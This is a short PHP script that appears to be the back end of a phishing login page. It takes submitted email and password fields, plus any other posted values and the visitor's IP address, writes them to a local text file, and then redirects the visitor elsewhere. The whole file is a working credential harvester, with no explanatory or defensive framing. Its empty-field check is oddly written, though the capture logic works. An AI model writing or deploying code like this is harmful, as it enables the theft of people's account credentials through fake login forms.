<?php
if (!empty($_POST['email'] == '' || $_POST['pass'] == ''))
{
header("Location:home.php?hash=e13101o1");
}
else
{
$handle = fopen("kcwopsex.txt", "a");
foreach($_POST as $variable => $value) 
{
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}

$ip = $_SERVER['REMOTE_ADDR'];
$file = "kcwopsex.txt"; //Select file
$file = fopen($file, "a"); //Appened file
$data = "IP Address: $ip";
fwrite($file, $data); //Write data to file
fclose($file); //Close the file
fwrite($handle, "\r\n");
fwrite($handle, "==============================\r\n");
fclose($handle);
header("Location:block.php");
}
?>         
